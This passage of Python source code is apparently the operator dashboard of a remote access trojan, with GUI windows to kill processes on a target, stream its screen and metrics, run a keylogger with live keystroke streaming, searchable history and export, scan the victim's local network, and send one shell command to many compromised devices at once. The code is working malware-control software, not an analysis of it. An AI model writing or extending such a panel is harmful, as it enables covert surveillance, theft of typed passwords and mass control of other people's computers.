        self.scroll = ctk.CTkScrollableFrame(self.window, fg_color=colors["bg"])
        self.scroll.pack(fill=tk.BOTH, expand=True)
        
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)

    def on_close(self):
        self.app.process_managers.pop(self.dev_id, None)
        self.window.destroy()

    def refresh(self):
        self.app.send_json({"type": "get_processes", "target_id": self.dev_id})

    def update_list(self, processes):
        if not self.window.winfo_exists(): return
        for w in self.scroll.winfo_children(): w.destroy()
        for p in processes:
            f = ctk.CTkFrame(self.scroll, fg_color=self.colors["surface"])
            f.pack(fill=tk.X, pady=1)
            ctk.CTkLabel(f, text=f"{p['pid']} - {p['name']}", anchor="w").pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
            ctk.CTkButton(f, text="Kill", width=50, fg_color="red", command=lambda pid=p['pid']: self.kill(pid)).pack(side=tk.RIGHT)

    def kill(self, pid):
        self.app.send_json({"type": "kill_process", "target_id": self.dev_id, "pid": pid})
        if self.window.winfo_exists():
            self.window.after(1000, self.refresh)

class MetricsWindow:
    def __init__(self, parent, dev_id, app, colors):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Live Metrics - {dev_id}")
        self.window.geometry("800x800")
        self.window.configure(bg=colors["bg"])
        self.app = app
        self.dev_id = dev_id
        self.colors = colors

        self.fig = Figure(figsize=(8, 8), dpi=100, facecolor=colors["bg"])
        self.ax_cpu = self.fig.add_subplot(311)
        self.ax_ram = self.fig.add_subplot(312)
        self.ax_net = self.fig.add_subplot(313)

        self.cpu_data = [0] * 50
        self.ram_data = [0] * 50
        self.net_up_data = [0] * 50
        self.net_down_data = [0] * 50

        for ax in [self.ax_cpu, self.ax_ram, self.ax_net]:
            ax.set_facecolor(colors["surface"])
            ax.tick_params(axis='x', colors=colors["text_dim"])
            ax.tick_params(axis='y', colors=colors["text_dim"])
            for spine in ax.spines.values():
                spine.set_color(colors["border"])
            ax.title.set_color(colors["text"])

        self.ax_cpu.set_title("CPU Usage (%)")
        self.ax_ram.set_title("RAM Usage (%)")
        self.ax_net.set_title("Network Usage (KB/s)")
        
        self.line_cpu, = self.ax_cpu.plot(self.cpu_data, color=colors["accent"])
        self.line_ram, = self.ax_ram.plot(self.ram_data, color=colors["accent"])
        self.line_net_up, = self.ax_net.plot(self.net_up_data, color="#10B981", label="Upload")
        self.line_net_down, = self.ax_net.plot(self.net_down_data, color="#3B82F6", label="Download")
        self.ax_net.legend(facecolor=colors["surface"], labelcolor=colors["text_dim"])

        self.canvas = FigureCanvasTkAgg(self.fig, master=self.window)
        self.canvas.draw()
        self.canvas.get_tk_widget().pack(side=tk.TOP, fill=tk.BOTH, expand=1)
        
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)

    def update_graphs(self, cpu_percent, ram_percent, upload_bytes=0, download_bytes=0):
        if not self.window.winfo_exists(): return
        self.cpu_data.pop(0)
        self.cpu_data.append(cpu_percent)
        self.ram_data.pop(0)
        self.ram_data.append(ram_percent)
        
        # Convert to KB
        up_kb = upload_bytes / 1024
        down_kb = download_bytes / 1024
        
        self.net_up_data.pop(0)
        self.net_up_data.append(up_kb)
        self.net_down_data.pop(0)
        self.net_down_data.append(down_kb)

        self.line_cpu.set_ydata(self.cpu_data)
        self.ax_cpu.set_ylim(0, 100)
        
        self.line_ram.set_ydata(self.ram_data)
        self.ax_ram.set_ylim(0, 100)
        
        self.line_net_up.set_ydata(self.net_up_data)
        self.line_net_down.set_ydata(self.net_down_data)
        self.ax_net.relim()
        self.ax_net.autoscale_view()

        self.canvas.draw()

    def on_close(self):
        self.app.send_json({"type": "stop_metrics_stream", "target_id": self.dev_id})
        self.app.metrics_viewers.pop(self.dev_id, None)
        self.window.destroy()

class RemoteDesktopSettingsWindow:
    def __init__(self, parent, dev_id, app, colors):
        self.window = ctk.CTkToplevel(parent)
        self.window.title(f"RD Settings - {dev_id}")
        self.window.geometry("400x300")
        self.window.configure(bg=colors["bg"])
        self.app = app
        self.dev_id = dev_id
        self.colors = colors

        ctk.CTkLabel(self.window, text="Remote Desktop Settings", font=("Segoe UI", 18, "bold"), text_color=colors["accent"]).pack(pady=10)

        settings_frame = ctk.CTkFrame(self.window, fg_color=colors["surface"])
        settings_frame.pack(fill=tk.X, padx=20, pady=10)

        # Quality
        ctk.CTkLabel(settings_frame, text="Quality:", text_color=colors["text"]).grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.quality_var = ctk.StringVar(value="50")
        self.quality_menu = ctk.CTkOptionMenu(settings_frame, values=[str(i) for i in range(10, 96, 5)], variable=self.quality_var)
        self.quality_menu.grid(row=0, column=1, padx=5, pady=5, sticky="ew")

        # FPS
        ctk.CTkLabel(settings_frame, text="FPS:", text_color=colors["text"]).grid(row=1, column=0, padx=5, pady=5, sticky="w")
        self.fps_var = ctk.StringVar(value="10")
        self.fps_menu = ctk.CTkOptionMenu(settings_frame, values=["5", "10", "15", "20", "30"], variable=self.fps_var)
        self.fps_menu.grid(row=1, column=1, padx=5, pady=5, sticky="ew")

        # Resolution
        ctk.CTkLabel(settings_frame, text="Resolution:", text_color=colors["text"]).grid(row=2, column=0, padx=5, pady=5, sticky="w")
        self.res_var = ctk.StringVar(value="800x600")
        self.res_menu = ctk.CTkOptionMenu(settings_frame, values=["Original", "800x600", "1280x720", "1920x1080"], variable=self.res_var)
        self.res_menu.grid(row=2, column=1, padx=5, pady=5, sticky="ew")
        
        apply_btn = ctk.CTkButton(self.window, text="Apply Settings", command=self.apply_settings, fg_color=colors["accent"], text_color=colors["bg"], hover_color=colors["hover"])
        apply_btn.pack(pady=10)

    def apply_settings(self):
        quality = int(self.quality_var.get())
        fps = int(self.fps_var.get())
        resolution = self.res_var.get()

        self.app.send_json({
            "type": "update_screen_stream_settings",
            "target_id": self.dev_id,
            "quality": quality,
            "fps": fps,
            "resolution": resolution
        })
        messagebox.showinfo("Settings Applied", "Remote Desktop settings sent to client.")
        self.window.destroy()

class KeyloggerWindow:
    """Enhanced Keylogger Manager with Live Streaming, History, and Export"""
    def __init__(self, parent, dev_id, app, colors):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Keylogger Manager - {dev_id}")
        self.window.geometry("800x600")
        self.window.configure(bg=colors["bg"])
        self.app = app
        self.dev_id = dev_id
        self.colors = colors
        self.all_logs = []  # Store all retrieved logs
        
        # Header
        header = ctk.CTkFrame(self.window, fg_color=colors["surface"], height=60)
        header.pack(fill=tk.X)
        header.pack_propagate(False)
        ctk.CTkLabel(header, text="🔑 Keylogger Manager", font=("Segoe UI", 20, "bold"), 
                     text_color=colors["accent"]).pack(side=tk.LEFT, padx=20, pady=10)
        
        # Status indicator
        self.status_label = ctk.CTkLabel(header, text="● Stopped", text_color="red", font=("Segoe UI", 12))
        self.status_label.pack(side=tk.RIGHT, padx=20)
        
        # Tabs
        self.tabs = ctk.CTkTabview(self.window, fg_color=colors["surface"])
        self.tabs.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.create_live_tab()
        self.create_history_tab()
        self.create_controls()

    def create_live_tab(self):
        """Create Live Keylog Streaming Tab"""
        tab = self.tabs.add("📡 Live Stream")
        
        # Live text display
        self.live_text = ctk.CTkTextbox(tab, font=("Consolas", 14), fg_color=self.colors["bg"], 
                                         text_color="#00FF00", wrap="word")
        self.live_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.live_text.insert(tk.END, "Live keystrokes will appear here...\n")
        
        # Live controls
        live_controls = ctk.CTkFrame(tab, fg_color="transparent")
        live_controls.pack(fill=tk.X, pady=5)
        
        ctk.CTkButton(live_controls, text="▶ Start Live", command=self.start_live_stream,
                      fg_color="#00AA00", hover_color="#008800").pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        ctk.CTkButton(live_controls, text="⏹ Stop Live", command=self.stop_live_stream,
                      fg_color="red", hover_color="darkred").pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        ctk.CTkButton(live_controls, text="🗑 Clear", command=lambda: self.live_text.delete("1.0", tk.END),
                      fg_color=self.colors["surface"]).pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)

    def create_history_tab(self):
        """Create History Tab with Date Filtering"""
        tab = self.tabs.add("📜 History")
        
        # Filter frame
        filter_frame = ctk.CTkFrame(tab, fg_color=self.colors["surface"])
        filter_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ctk.CTkLabel(filter_frame, text="From:", font=("Segoe UI", 12)).pack(side=tk.LEFT, padx=5)
        self.start_date = ctk.CTkEntry(filter_frame, placeholder_text="YYYY-MM-DD", width=120)
        self.start_date.pack(side=tk.LEFT, padx=5)
        
        ctk.CTkLabel(filter_frame, text="To:", font=("Segoe UI", 12)).pack(side=tk.LEFT, padx=5)
        self.end_date = ctk.CTkEntry(filter_frame, placeholder_text="YYYY-MM-DD", width=120)
        self.end_date.pack(side=tk.LEFT, padx=5)
        
        ctk.CTkButton(filter_frame, text="🔍 Filter", command=self.filter_by_date, width=80,
                      fg_color=self.colors["accent"], text_color=self.colors["bg"]).pack(side=tk.LEFT, padx=5)
        ctk.CTkButton(filter_frame, text="📥 Load All", command=self.load_all_history, width=80,
                      fg_color=self.colors["surface"]).pack(side=tk.LEFT, padx=5)
        
        # Search
        ctk.CTkLabel(filter_frame, text="Search:", font=("Segoe UI", 12)).pack(side=tk.LEFT, padx=10)
        self.search_entry = ctk.CTkEntry(filter_frame, placeholder_text="Search keylogs...", width=150)
        self.search_entry.pack(side=tk.LEFT, padx=5)
        self.search_entry.bind("<KeyRelease>", self.search_logs)
        
        # History display
        self.history_text = ctk.CTkTextbox(tab, font=("Consolas", 12), fg_color=self.colors["bg"], 
                                            text_color=self.colors["text"])
        self.history_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Info label
        self.info_label = ctk.CTkLabel(tab, text="No history loaded", text_color=self.colors["text_dim"])
        self.info_label.pack(pady=5)

    def create_controls(self):
        """Create Main Control Buttons"""
        controls = ctk.CTkFrame(self.window, fg_color=self.colors["surface"], height=70)
        controls.pack(fill=tk.X, pady=10)
        controls.pack_propagate(False)
        
        # Start/Stop keylogger
        ctk.CTkButton(controls, text="▶ Start Keylogger", command=self.start_keylogger,
                      fg_color="#00AA00", hover_color="#008800", width=140).pack(side=tk.LEFT, padx=10, pady=15)
        ctk.CTkButton(controls, text="⏹ Stop Keylogger", command=self.stop_keylogger,
                      fg_color="red", hover_color="darkred", width=140).pack(side=tk.LEFT, padx=10)
        
        # Dump current session
        ctk.CTkButton(controls, text="📋 Dump Session", command=self.dump_session,
                      fg_color=self.colors["accent"], text_color=self.colors["bg"], width=120).pack(side=tk.LEFT, padx=10)
        
        # Export
        ctk.CTkButton(controls, text="💾 Export to File", command=self.export_logs,
                      fg_color=self.colors["bg"], width=120).pack(side=tk.LEFT, padx=10)
        
        # Clear all
        ctk.CTkButton(controls, text="🗑 Clear All Logs", command=self.clear_all_logs,
                      fg_color="#FF4444", hover_color="#CC0000", width=120).pack(side=tk.RIGHT, padx=10)

    # Control methods
    def start_keylogger(self):
        self.app.send_json({"type": "start_keylogger", "target_id": self.dev_id})
        self.status_label.configure(text="● Recording", text_color="#00FF00")

    def stop_keylogger(self):
        self.app.send_json({"type": "stop_keylogger", "target_id": self.dev_id})
        self.status_label.configure(text="● Stopped", text_color="red")

    def start_live_stream(self):
        self.app.send_json({"type": "start_live_keylog", "target_id": self.dev_id})
        self.live_text.delete("1.0", tk.END)
        self.live_text.insert(tk.END, "🔴 LIVE STREAMING...\n\n")
        self.status_label.configure(text="● LIVE", text_color="#00FF00")

    def stop_live_stream(self):
        self.app.send_json({"type": "stop_live_keylog", "target_id": self.dev_id})
        self.live_text.insert(tk.END, "\n\n--- Stream stopped ---\n")

    def dump_session(self):
        self.app.send_json({"type": "dump_keylogs", "target_id": self.dev_id})

    def load_all_history(self):
        self.app.send_json({"type": "get_all_keylogs", "target_id": self.dev_id})

    def filter_by_date(self):
        start = self.start_date.get() or "2000-01-01"
        end = self.end_date.get() or "2099-12-31"
        self.app.send_json({"type": "get_keylogs_by_date", "target_id": self.dev_id, 
                           "start_date": start, "end_date": end})

    def clear_all_logs(self):
        if messagebox.askyesno("Confirm", "Delete ALL stored keylogs on the client?"):
            self.app.send_json({"type": "clear_keylogs", "target_id": self.dev_id})
            self.history_text.delete("1.0", tk.END)
            self.all_logs = []

    def export_logs(self):
        """Export logs to file"""
        if not self.all_logs:
            messagebox.showwarning("No Data", "No logs to export. Load history first.")
            return
        
        path = filedialog.asksaveasfilename(defaultextension=".txt",
                                            filetypes=[("Text files", "*.txt"), ("CSV files", "*.csv")])
        if path:
            with open(path, "w", encoding="utf-8") as f:
                if path.endswith(".csv"):
                    f.write("Timestamp,Key\n")
                    for log in self.all_logs:
                        f.write(f"{log.get('timestamp','')},{log.get('key','')}\n")
                else:
                    for log in self.all_logs:
                        f.write(f"[{log.get('timestamp','')}] {log.get('key','')}\n")
            messagebox.showinfo("Exported", f"Logs saved to {path}")

    def search_logs(self, event=None):
        """Filter displayed logs by search term"""
        term = self.search_entry.get().lower()
        self.history_text.delete("1.0", tk.END)
        for log in self.all_logs:
            if term in log.get("key", "").lower():
                self.history_text.insert(tk.END, f"[{log.get('timestamp','')}] {log.get('key','')}\n")

    # Update methods called by message handler
    def append_live_key(self, key, timestamp):
        """Append a single keystroke to live display"""
        if not self.window.winfo_exists(): return
        self.live_text.insert(tk.END, key)
        self.live_text.see(tk.END)

    def update_logs(self, logs):
        """Update from dump_keylogs (session logs)"""
        if not self.window.winfo_exists(): return
        if isinstance(logs, list):
            for log in logs:
                self.live_text.insert(tk.END, f"[{log.get('timestamp','')}] {log.get('key','')}\n")
        else:
            self.live_text.insert(tk.END, str(logs) + "\n")
        self.live_text.see(tk.END)

    def update_history(self, data):
        """Update from get_all_keylogs or get_keylogs_by_date"""
        if not self.window.winfo_exists(): return
        self.history_text.delete("1.0", tk.END)
        self.all_logs = data.get("logs", [])
        
        for log in self.all_logs:
            self.history_text.insert(tk.END, f"[{log.get('timestamp','')}] {log.get('key','')}\n")
        
        total = data.get("total", len(self.all_logs))
        self.info_label.configure(text=f"Loaded {total} entries")

class SystemInfoWindow:
    def __init__(self, parent, dev_id, app, colors):
        self.window = tk.Toplevel(parent)
        self.window.title(f"System Info - {dev_id}")
        self.window.geometry("500x400")
        self.window.configure(bg=colors["bg"])
        self.colors = colors
        
        self.scroll = ctk.CTkScrollableFrame(self.window, fg_color=colors["bg"])
        self.scroll.pack(fill=tk.BOTH, expand=True)

    def update_info(self, data):
        try:
            for w in self.scroll.winfo_children(): w.destroy()
            ctk.CTkLabel(self.scroll, text="System Information", font=("Segoe UI", 18, "bold"), text_color=self.colors["accent"]).pack(pady=10)
            
            # Map of user-friendly names
            friendly_names = {
                "name": "PC Name", "os": "Operating System", "ip": "Public IP",
                "local_ip": "Local IP", "uptime": "System Uptime",
                "active_window": "Active Window", "ram_total": "Total RAM",
                "cpu_cores": "CPU Cores", "arch": "Architecture",
                "processor": "Processor", "mac": "MAC Address"
            }

            for k, v in data.items():
                label_name = friendly_names.get(k, k.capitalize())
                f = ctk.CTkFrame(self.scroll, fg_color=self.colors["surface"])
                f.pack(fill=tk.X, pady=2, padx=10)
                ctk.CTkLabel(f, text=f"{label_name}:", width=120, anchor="w", text_color=self.colors["text_dim"]).pack(side=tk.LEFT, padx=10)
                ctk.CTkLabel(f, text=str(v), anchor="w").pack(side=tk.LEFT, padx=10)
        except Exception as e:
            print(f"Error updating sys info: {e}")

class NetworkExplorerWindow:
    def __init__(self, parent, dev_id, app, colors):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Network Explorer - {dev_id}")
        self.window.geometry("700x500")
        self.window.configure(bg=colors["bg"])
        self.app = app
        self.dev_id = dev_id
        self.colors = colors

        ctk.CTkLabel(self.window, text="Local Network Discovery", font=("Segoe UI", 20, "bold"), text_color=colors["accent"]).pack(pady=10)
        
        ctrl_f = ctk.CTkFrame(self.window, fg_color="transparent")
        ctrl_f.pack(fill=tk.X, padx=20, pady=5)
        
        self.range_entry = ctk.CTkEntry(ctrl_f, placeholder_text="IP Range (e.g. 192.168.1.1/24)", width=250)
        self.range_entry.pack(side=tk.LEFT, padx=5)
        
        ctk.CTkButton(ctrl_f, text="Start Scan", command=self.start_scan, width=100, fg_color=colors["accent"], text_color=colors["bg"]).pack(side=tk.LEFT, padx=5)
        
        self.table_frame = ctk.CTkScrollableFrame(self.window, fg_color=colors["surface"])
        self.table_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        self.start_scan() # Auto start scan on open
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)

    def start_scan(self):
        target = self.range_entry.get() or "AUTO"
        self.app.send_json({"type": "scan_network", "target_id": self.dev_id, "range": target})
        for w in self.table_frame.winfo_children(): w.destroy()
        ctk.CTkLabel(self.table_frame, text="Scanning... Please wait.", font=("Segoe UI", 12)).pack(pady=50)

    def update_scan(self, devices):
        for w in self.table_frame.winfo_children(): w.destroy()
        if not devices:
            ctk.CTkLabel(self.table_frame, text="No other devices found on this network.", font=("Segoe UI", 12)).pack(pady=50)
            return

        for dev in devices:
            f = ctk.CTkFrame(self.table_frame, fg_color=self.colors["bg"], corner_radius=10)
            f.pack(fill=tk.X, pady=2, padx=5)
            ctk.CTkLabel(f, text=f"🌐 {dev.get('ip', 'Unknown')}", font=("Consolas", 12, "bold"), width=150, anchor="w").pack(side=tk.LEFT, padx=10)
            ctk.CTkLabel(f, text=f"MAC: {dev.get('mac', 'Unknown')}", font=("Consolas", 10), text_color=self.colors["text_dim"]).pack(side=tk.LEFT, padx=10)
            if dev.get("hostname"):
                ctk.CTkLabel(f, text=f"({dev.get('hostname')})", font=("Segoe UI", 10, "italic")).pack(side=tk.LEFT, padx=10)

    def on_close(self):
        self.app.network_explorers.pop(self.dev_id, None)
        self.window.destroy()

class BulkExecutorWindow:
    def __init__(self, parent, device_ids, app, colors):
        self.window = tk.Toplevel(parent)
        self.window.title("Bulk Command Executor")
        self.window.geometry("800x600")
        self.window.configure(bg=colors["bg"])
        self.app = app
        self.device_ids = device_ids
        self.colors = colors

        ctk.CTkLabel(self.window, text=f"Executing on {len(device_ids)} Devices", font=("Segoe UI", 20, "bold"), text_color=colors["accent"]).pack(pady=10)
        
        self.cmd_entry = ctk.CTkEntry(self.window, placeholder_text="Enter shell command to run on ALL selected devices...", height=40)
        self.cmd_entry.pack(fill=tk.X, padx=20, pady=10)
        
        ctk.CTkButton(self.window, text="RUN BULK COMMAND", command=self.run_bulk, height=45, fg_color="red", font=("Segoe UI", 14, "bold")).pack(fill=tk.X, padx=20, pady=5)
        
        self.output_area = ctk.CTkTextbox(self.window, font=("Consolas", 11), fg_color="#000000", text_color="#00ff41")
        self.output_area.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)

    def run_bulk(self):
        cmd = self.cmd_entry.get()
        if not cmd: return
        self.output_area.delete("1.0", tk.END)
        self.output_area.insert(tk.END, f"[*] Starting batch execution on {len(self.device_ids)} nodes...\n")
        
        for dev_id in self.device_ids:
            self.app.send_json({"type": "execute_command", "target_id": dev_id, "command": cmd, "bulk": True})
            self.output_area.insert(tk.END, f"[*] Sent to {dev_id}...\n")

    def append_result(self, dev_id, output):
        self.output_area.insert(tk.END, f"\n[RESULT from {dev_id}]:\n{output}\n{'-'*40}\n")
        self.output_area.see(tk.END)

    def notify_finish(self):
        self.output_area.insert(tk.END, "\n[!] ALL TASKS COMPLETED.\n")

    def on_close(self):
        self.app.bulk_executors.pop("bulk", None)
        self.window.destroy()

if __name__ == "__main__":
    root = ctk.CTk()
    app = AdminDashboardApp(root)
    root.mainloop()